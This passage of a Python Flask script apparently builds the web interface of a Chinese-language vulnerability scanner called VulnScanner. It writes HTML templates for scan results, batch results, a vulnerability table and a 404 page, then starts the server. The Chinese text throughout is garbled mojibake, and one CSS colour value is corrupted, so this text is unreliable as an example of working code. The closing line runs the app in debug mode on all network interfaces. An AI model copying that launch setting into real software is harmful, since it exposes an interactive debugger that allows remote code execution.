                    data: [12, 28, 10],
                    backgroundColor: [
                        'rgba(233, 69, 96, 0.8)',
                        'rgba(15, 157, 88, 0.8)',
                        'rgba(66, 133, 244, 0.8)'
                    ],
                    borderColor: [
                        'rgba(233, 69, 96, 1)',
                        'rgba(15, 157, 88, 1)',
                        'rgba(66, 133, 244, 1)'
                    ],
                    borderWidth: 1
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        position: 'bottom',
                        labels: {
                            color: '#f0f0f0',
                            font: {
                                size: 14
                            }
                        }
                    },
                    title: {
                        display: true,
                        text: 'æ¼æ´åˆ†å¸ƒç»Ÿè®¡',
                        color: '#f0f0f0',
                        font: {
                            size: 18
                        }
                    }
                }
            }
        });
    </script>
</body>
</html>""")

    # åˆ›å»º results.html
    results_path = os.path.join(templates_dir, 'results.html')
    with open(results_path, 'w', encoding='utf-8') as f:
        f.write("""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>æ‰«æç»“æœ - VulnScanner</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #1a1a2e;
            --secondary: #16213e;
            --accent: #e94560;
            --warning: #ff9a3c;
            --success: #0f9d58;
            --info: #4285f4;
            --text-light: #f0f0f0;
            --text-dark: #333;
            --card-bg: rgba(255, 255, 255, 0.08);
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            color: var(--text-light);
            min-height: 100vh;
            background-attachment: fixed;
            line-height: 1.6;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        header {
            background: rgba(10, 10, 20, 0.85);
            backdrop-filter: blur(10px);
            padding: 15px 0;
            border-bottom: 1px solid rgba(233, 69, 96, 0.3);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 1.8rem;
            color: var(--text-light);
            text-decoration: none;
        }

        .logo-icon {
            color: var(--accent);
            font-size: 2rem;
        }

        .nav-links {
            display: flex;
            gap: 25px;
        }

        .nav-link {
            color: var(--text-light);
            text-decoration: none;
            font-weight: 500;
            font-size: 1.1rem;
            transition: var(--transition);
            padding: 8px 15px;
            border-radius: 4px;
        }

        .nav-link:hover, .nav-link.active {
            background: rgba(233, 69, 96, 0.2);
            color: var(--accent);
        }

        .hero {
            padding: 50px 0 30px;
            text-align: center;
        }

        .hero h1 {
            font-size: 2.5rem;
            margin-bottom: 15px;
            font-weight: 700;
            background: linear-gradient(45deg, var(--accent), var(--warning));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-family: 'Orbitron', sans-serif;
        }

        .hero p {
            font-size: 1.1rem;
            opacity: 0.85;
        }

        .card {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .card-title {
            font-size: 1.6rem;
            margin-bottom: 20px;
            color: var(--accent);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .result-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 25px;
            margin-top: 20px;
        }

        .vuln-card {
            background: rgba(0, 0, 0, 0.25);
            border-radius: 10px;
            padding: 20px;
            border-left: 4px solid var(--accent);
        }

        .vuln-card.safe {
            border-left-color: var(--success);
        }

        .vuln-card.vulnerable {
            border-left-color: var(--accent);
            background: rgba(233, 69, 96, 0.1);
        }

        .vuln-card h3 {
            font-size: 1.2rem;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .status-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 500;
        }

        .status-vulnerable {
            background: var(--accent);
        }

        .status-safe {
            background: var(--success);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 25px 0;
        }

        th, td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        th {
            background: rgba(0, 0, 0, 0.3);
            font-weight: 500;
            color: var(--accent);
        }

        tr:hover {
            background: rgba(255, 255, 255, 0.05);
        }

        .btn {
            display: inline-block;
            background: var(--info);
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 1rem;
            font-weight: 500;
            border-radius: 6px;
            cursor: pointer;
            transition: var(--transition);
            text-align: center;
            text-decoration: none;
            margin-top: 20px;
        }

        .btn:hover {
            background: #2b6de9;
            transform: translateY(-3px);
            box-shadow: 0 7px 15px rgba(66, 133, 244, 0.3);
        }

        footer {
            text-align: center;
            padding: 40px 0;
            margin-top: 60px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            color: rgba(255, 255, 255, 0.6);
        }

        .alert {
            padding: 15px;
            border-radius: 6px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .alert-danger {
            background: rgba(233, 69, 96, 0.2);
            border: 1px solid var(--accent);
        }

        .alert-warning {
            background: rgba(255, 154, 60, 0.2);
            border: 1px solid var(--warning);
        }

        .alert-success {
            background: rgba(15, 157, 88, 0.2);
            border: 1px solid var(--success);
        }

        /* Responsive styles */
        @media (max-width: 768px) {
            .result-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div class="navbar">
                <a href="/" class="logo">
                    <span class="logo-icon">ğŸ”’</span>
                    <span>VulnScanner</span>
                </a>
                <div class="nav-links">
                    <a href="/" class="nav-link">é¦–é¡µ</a>
                    <a href="/vulnerabilities" class="nav-link">æ¼æ´åº“</a>
                </div>
            </div>
        </div>
    </header>

    <main class="container">
        <div class="hero">
            <h1>æ‰«æç»“æœ</h1>
            <p>ç›®æ ‡: {{ url }} | æ‰«æç±»å‹: {{ scan_type }}</p>
        </div>

        <div class="card">
            <h2 class="card-title">æ¼æ´æ£€æµ‹ç»“æœ</h2>

            <div class="result-grid">
                {% for result in results %}
                <div class="vuln-card {% if result.vulnerable %}vulnerable{% else %}safe{% endif %}">
                    <h3>
                        <span>{{ result.name }}</span>
                        <span class="status-badge {% if result.vulnerable %}status-vulnerable{% else %}status-safe{% endif %}">
                            {% if result.vulnerable %}å­˜åœ¨æ¼æ´{% else %}å®‰å…¨{% endif %}
                        </span>
                    </h3>
                    <p><strong>çŠ¶æ€:</strong> {{ result.message }}</p>
                    <p><strong>è€—æ—¶:</strong> {{ result.time }}</p>
                </div>
                {% endfor %}
            </div>

            <a href="/" class="btn">è¿”å›é¦–é¡µ</a>
        </div>
    </main>

    <footer>
        <div class="container">
            <p>æ¼æ´æ‰«æç³»ç»Ÿ &copy; {{ now.strftime('%Y') }} - å®‰å…¨é˜²æŠ¤ä¸“å®¶</p>
            <p>æ‰«æå®Œæˆæ—¶é—´: {{ now.strftime('%Y-%m-%d %H:%M:%S') }}</p>
        </div>
    </footer>
</body>
</html>""")

    # åˆ›å»º batch_results.html
    batch_results_path = os.path.join(templates_dir, 'batch_results.html')
    with open(batch_results_path, 'w', encoding='utf-8') as f:
        f.write("""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>æ‰¹é‡æ‰«æç»“æœ - VulnScanner</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #1a1a2e;
            --secondary: #16213e;
            --accent: #e94560;
            --warning: #ff9a3c;
            --success: #0f9d58;
            --info: #4285fæ;
            --text-light: #f0f0f0;
            --text-dark: #333;
            --card-bg: rgba(255, 255, 255, 0.08);
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            color: var(--text-light);
            min-height: 100vh;
            background-attachment: fixed;
            line-height: 1.6;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        header {
            background: rgba(10, 10, 20, 0.85);
            backdrop-filter: blur(10px);
            padding: 15px 0;
            border-bottom: 1px solid rgba(233, 69, 96, 0.3);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 1.8rem;
            color: var(--text-light);
            text-decoration: none;
        }

        .logo-icon {
            color: var(--accent);
            font-size: 2rem;
        }

        .nav-links {
            display: flex;
            gap: 25px;
        }

        .nav-link {
            color: var(--text-light);
            text-decoration: none;
            font-weight: 500;
            font-size: 1.1rem;
            transition: var(--transition);
            padding: 8px 15px;
            border-radius: 4px;
        }

        .nav-link:hover, .nav-link.active {
            background: rgba(233, 69, 96, 0.2);
            color: var(--accent);
        }

        .hero {
            padding: 50px 0 30px;
            text-align: center;
        }

        .hero h1 {
            font-size: 2.5rem;
            margin-bottom: 15px;
            font-weight: 700;
            background: linear-gradient(45deg, var(--accent), var(--warning));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-family: 'Orbitron', sans-serif;
        }

        .hero p {
            font-size: 1.1rem;
            opacity: 0.85;
        }

        .card {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .card-title {
            font-size: 1.6rem;
            margin-bottom: 20px;
            color: var(--accent);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .result-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 25px;
            margin-top: 20px;
        }

        .vuln-card {
            background: rgba(0, 0, 0, 0.25);
            border-radius: 10px;
            padding: 20px;
            border-left: 4px solid var(--accent);
        }

        .vuln-card.safe {
            border-left-color: var(--success);
        }

        .vuln-card.vulnerable {
            border-left-color: var(--accent);
            background: rgba(233, 69, 96, 0.1);
        }

        .vuln-card h3 {
            font-size: 1.2rem;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .status-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 500;
        }

        .status-vulnerable {
            background: var(--accent);
        }

        .status-safe {
            background: var(--success);
        }

        .target-card {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border-left: 4px solid var(--info);
        }

        .vulnerable-count {
            font-size: 1.2rem;
            margin: 10px 0;
            padding: 8px 15px;
            background: rgba(233, 69, 96, 0.2);
            border-radius: 20px;
            display: inline-block;
        }

        .btn {
            display: inline-block;
            background: var(--info);
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 1rem;
            font-weight: 500;
            border-radius: 6px;
            cursor: pointer;
            transition: var(--transition);
            text-align: center;
            text-decoration: none;
            margin-top: 20px;
        }

        .btn:hover {
            background: #2b6de9;
            transform: translateY(-3px);
            box-shadow: 0 7px 15px rgba(66, 133, 244, 0.3);
        }

        footer {
            text-align: center;
            padding: 40px 0;
            margin-top: 60px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            color: rgba(255, 255, 255, 0.6);
        }

        .alert {
            padding: 15px;
            border-radius: 6px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .alert-danger {
            background: rgba(233, 69, 96, 0.2);
            border: 1px solid var(--accent);
        }

        .alert-warning {
            background: rgba(255, 154, 60, 0.2);
            border: 1px solid var(--warning);
        }

        .alert-success {
            background: rgba(15, 157, 88, 0.2);
            border: 1px solid var(--success);
        }

        /* Responsive styles */
        @media (max-width: 768px) {
            .result-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div class="navbar">
                <a href="/" class="logo">
                    <span class="logo-icon">ğŸ”’</span>
                    <span>VulnScanner</span>
                </a>
                <div class="nav-links">
                    <a href="/" class="nav-link">é¦–é¡µ</a>
                    <a href="/vulnerabilities" class="nav-link">æ¼æ´åº“</a>
                </div>
            </div>
        </div>
    </header>

    <main class="container">
        <div class="hero">
            <h1>æ‰¹é‡æ‰«æç»“æœ</h1>
            <p>æ‰«æç±»å‹: {{ scan_type }} | ç›®æ ‡æ•°é‡: {{ results|length }}</p>
        </div>

        <div class="card">
            <h2 class="card-title">æ‰«æç»“æœæ¦‚è§ˆ</h2>

            {% for result in results %}
            <div class="target-card">
                <h3>ç›®æ ‡: {{ result.url }}</h3>

                {% if 'error' in result %}
                    <div class="alert alert-danger">
                        <span>âš ï¸</span>
                        <div>
                            <strong>æ‰«æé”™è¯¯:</strong> {{ result.error }}
                        </div>
                    </div>
                {% else %}
                    <p class="vulnerable-count">æ£€æµ‹åˆ°æ¼æ´æ•°é‡: {{ result.vulnerabilities_count }}</p>

                    <div class="result-grid">
                        {% for detail in result.details %}
                        <div class="vuln-card {% if detail.vulnerable %}vulnerable{% else %}safe{% endif %}">
                            <h3>
                                <span>{{ detail.name }}</span>
                                <span class="status-badge {% if detail.vulnerable %}status-vulnerable{% else %}status-safe{% endif %}">
                                    {% if detail.vulnerable %}å­˜åœ¨æ¼æ´{% else %}å®‰å…¨{% endif %}
                                </span>
                            </h3>
                            <p>{{ detail.message }}</p>
                            <p><strong>è€—æ—¶:</strong> {{ detail.time }}</p>
                        </div>
                        {% endfor %}
                    </div>
                {% endif %}
            </div>
            {% endfor %}

            <a href="/" class="btn">è¿”å›é¦–é¡µ</a>
        </div>
    </main>

    <footer>
        <div class="container">
            <p>æ¼æ´æ‰«æç³»ç»Ÿ &copy; {{ now.strftime('%Y') }} - å®‰å…¨é˜²æŠ¤ä¸“å®¶</p>
            <p>æ‰«æå®Œæˆæ—¶é—´: {{ now.strftime('%Y-%m-%d %H:%M:%S') }}</p>
        </div>
    </footer>
</body>
</html>""")

    # åˆ›å»º vulnerabilities.html
    vulnerabilities_path = os.path.join(templates_dir, 'vulnerabilities.html')
    with open(vulnerabilities_path, 'w', encoding='utf-8') as f:
        f.write("""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>æ¼æ´åº“ - VulnScanner</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #1a1a2e;
            --secondary: #16213e;
            --accent: #e94560;
            --warning: #ff9a3c;
            --success: #0f9d58;
            --info: #4285f4;
            --text-light: #f0f0f0;
            --text-dark: #333;
            --card-bg: rgba(255, 255, 255, 0.08);
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            color: var(--text-light);
            min-height: 100vh;
            background-attachment: fixed;
            line-height: 1.6;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        header {
            background: rgba(10, 10, 20, 0.85);
            backdrop-filter: blur(10px);
            padding: 15px 0;
            border-bottom: 1px solid rgba(233, 69, 96, 0.3);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 1.8rem;
            color: var(--text-light);
            text-decoration: none;
        }

        .logo-icon {
            color: var(--accent);
            font-size: 2rem;
        }

        .nav-links {
            display: flex;
            gap: 25px;
        }

        .nav-link {
            color: var(--text-light);
            text-decoration: none;
            font-weight: 500;
            font-size: 1.1rem;
            transition: var(--transition);
            padding: 8px 15px;
            border-radius: 4px;
        }

        .nav-link:hover, .nav-link.active {
            background: rgba(233, 69, 96, 0.2);
            color: var(--accent);
        }

        .hero {
            padding: 50px 0 30px;
            text-align: center;
        }

        .hero h1 {
            font-size: 2.5rem;
            margin-bottom: 15px;
            font-weight: 700;
            background: linear-gradient(45deg, var(--accent), var(--warning));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-family: 'Orbitron', sans-serif;
        }

        .hero p {
            font-size: 1.1rem;
            opacity: 0.85;
        }

        .card {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .card-title {
            font-size: 1.6rem;
            margin-bottom: 20px;
            color: var(--accent);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }

        input, select, textarea {
            width: 100%;
            padding: 14px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 6px;
            color: var(--text-light);
            font-size: 1rem;
            transition: var(--transition);
        }

        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: var(--accent);
            background: rgba(0, 0, 0, 0.4);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 25px 0;
        }

        th, td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        th {
            background: rgba(0, 0, 0, 0.3);
            font-weight: 500;
            color: var(--accent);
        }

        tr:hover {
            background: rgba(255, 255, 255, 0.05);
        }

        .btn {
            display: inline-block;
            background: var(--info);
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 1rem;
            font-weight: 500;
            border-radius: 6px;
            cursor: pointer;
            transition: var(--transition);
            text-align: center;
            text-decoration: none;
            margin-top: 20px;
        }

        .btn:hover {
            background: #2b6de9;
            transform: translateY(-3px);
            box-shadow: 0 7px 15px rgba(66, 133, 244, 0.3);
        }

        footer {
            text-align: center;
            padding: 40px 0;
            margin-top: 60px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            color: rgba(255, 255, 255, 0.6);
        }

        .severity-badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 4px;
            font-size: 0.85rem;
            font-weight: 500;
        }

        .severity-high {
            background: var(--accent);
        }

        .severity-critical {
            background: #d32f2f;
        }

        .severity-medium {
            background: var(--warning);
        }

        /* Responsive styles */
        @media (max-width: 768px) {
            table {
                display: block;
                overflow-x: auto;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div class="navbar">
                <a href="/" class="logo">
                    <span class="logo-icon">ğŸ”’</span>
                    <span>VulnScanner</span>
                </a>
                <div class="nav-links">
                    <a href="/" class="nav-link">é¦–é¡µ</a>
                    <a href="/vulnerabilities" class="nav-link active">æ¼æ´åº“</a>
                </div>
            </div>
        </div>
    </header>

    <main class="container">
        <div class="hero">
            <h1>æ¼æ´æ•°æ®åº“</h1>
            <p>åŒ…å«å¸¸è§æ¼æ´çš„è¯¦ç»†ä¿¡æ¯ã€å½±å“ç‰ˆæœ¬å’Œè§£å†³æ–¹æ¡ˆ</p>
        </div>

        <div class="card">
            <div class="form-group">
                <input type="text" placeholder="æœç´¢æ¼æ´åç§°ã€CVE IDæˆ–å…³é”®è¯...">
            </div>

            <table>
                <thead>
                    <tr>
                        <th>CVE ID</th>
                        <th>æ¼æ´åç§°</th>
                        <th>ä¸¥é‡ç¨‹åº¦</th>
                        <th>å½±å“ç‰ˆæœ¬</th>
                        <th>è§£å†³æ–¹æ¡ˆ</th>
                    </tr>
                </thead>
                <tbody>
                    {% for vuln in vuln_db %}
                    <tr>
                        <td>{{ vuln.id }}</td>
                        <td>{{ vuln.name }}</td>
                        <td>
                            {% if vuln.severity == 'ä¸¥é‡' %}
                                <span class="severity-badge severity-critical">{{ vuln.severity }}</span>
                            {% elif vuln.severity == 'é«˜å±' %}
                                <span class="severity-badge severity-high">{{ vuln.severity }}</span>
                            {% else %}
                                <span class="severity-badge severity-medium">{{ vuln.severity }}</span>
                            {% endif %}
                        </td>
                        <td>{{ vuln.affected_versions }}</td>
                        <td>{{ vuln.solution }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>

            <a href="/" class="btn">è¿”å›é¦–é¡µ</a>
        </div>
    </main>

    <footer>
        <div class="container">
            <p>æ¼æ´æ‰«æç³»ç»Ÿ &copy; {{ now.strftime('%Y') }} - å®‰å…¨é˜²æŠ¤ä¸“å®¶</p>
            <p>æ•°æ®åº“æ›´æ–°æ—¶é—´: {{ now.strftime('%Y-%m-%d %H:%M:%S') }}</p>
        </div>
    </footer>
</body>
</html>""")

    # åˆ›å»º 404.html
    not_found_path = os.path.join(templates_dir, '404.html')
    with open(not_found_path, 'w', encoding='utf-8') as f:
        f.write("""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>é¡µé¢æœªæ‰¾åˆ° - VulnScanner</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #1a1a2e;
            --secondary: #16213e;
            --accent: #e94560;
            --warning: #ff9a3c;
            --success: #0f9d58;
            --info: #4285f4;
            --text-light: #f0f0f0;
            --text-dark: #333;
            --card-bg: rgba(255, 255, 255, 0.08);
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            color: var(--text-light);
            min-height: 100vh;
            background-attachment: fixed;
            line-height: 1.6;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        header {
            background: rgba(10, 10, 20, 0.85);
            backdrop-filter: blur(10px);
            padding: 15px 0;
            border-bottom: 1px solid rgba(233, 69, 96, 0.3);
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 1.8rem;
            color: var(--text-light);
            text-decoration: none;
        }

        .logo-icon {
            color: var(--accent);
            font-size: 2rem;
        }

        .nav-links {
            display: flex;
            gap: 25px;
        }

        .nav-link {
            color: var(--text-light);
            text-decoration: none;
            font-weight: 500;
            font-size: 1.1rem;
            transition: var(--transition);
            padding: 8px 15px;
            border-radius: 4px;
        }

        .nav-link:hover, .nav-link.active {
            background: rgba(233, 69, 96, 0.2);
            color: var(--accent);
        }

        .error-container {
            text-align: center;
            padding: 100px 0;
        }

        .error-code {
            font-size: 8rem;
            font-weight: 700;
            background: linear-gradient(45deg, var(--accent), var(--warning));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-family: 'Orbitron', sans-serif;
            margin-bottom: 20px;
        }

        .error-message {
            font-size: 2rem;
            margin-bottom: 30px;
        }

        .btn {
            display: inline-block;
            background: var(--info);
            color: white;
            border: none;
            padding: 14px 30px;
            font-size: 1.1rem;
            font-weight: 500;
            border-radius: 6px;
            cursor: pointer;
            transition: var(--transition);
            text-align: center;
            text-decoration: none;
        }

        .btn:hover {
            background: #2b6de9;
            transform: translateY(-3px);
            box-shadow: 0 7px 15px rgba(66, 133, 244, 0.3);
        }

        footer {
            text-align: center;
            padding: 40px 0;
            margin-top: 60px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            color: rgba(255, 255, 255, 0.6);
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div class="navbar">
                <a href="/" class="logo">
                    <span class="logo-icon">ğŸ”’</span>
                    <span>VulnScanner</span>
                </a>
                <div class="nav-links">
                    <a href="/" class="nav-link">é¦–é¡µ</a>
                    <a href="/vulnerabilities" class="nav-link">æ¼æ´åº“</a>
                </div>
            </div>
        </div>
    </header>

    <main class="container">
        <div class="error-container">
            <div class="error-code">404</div>
            <div class="error-message">é¡µé¢æœªæ‰¾åˆ°</div>
            <p>è¯·æ±‚çš„é¡µé¢ä¸å­˜åœ¨ï¼Œè¯·æ£€æŸ¥URLæ˜¯å¦æ­£ç¡®</p>
            <a href="/" class="btn">è¿”å›é¦–é¡µ</a>
        </div>
    </main>

    <footer>
        <div class="container">
            <p>æ¼æ´æ‰«æç³»ç»Ÿ &copy; {{ now.strftime('%Y') }} - å®‰å…¨é˜²æŠ¤ä¸“å®¶</p>
        </div>
    </footer>
</body>
</html>""")


# è¿è¡Œåº”ç”¨
if __name__ == '__main__':
    # ç¡®ä¿æ¨¡æ¿ç›®å½•å’Œæ–‡ä»¶å­˜åœ¨
    ensure_template_directory()

    # è¿è¡Œåº”ç”¨
    app.run(host='0.0.0.0', port=5000, debug=True)
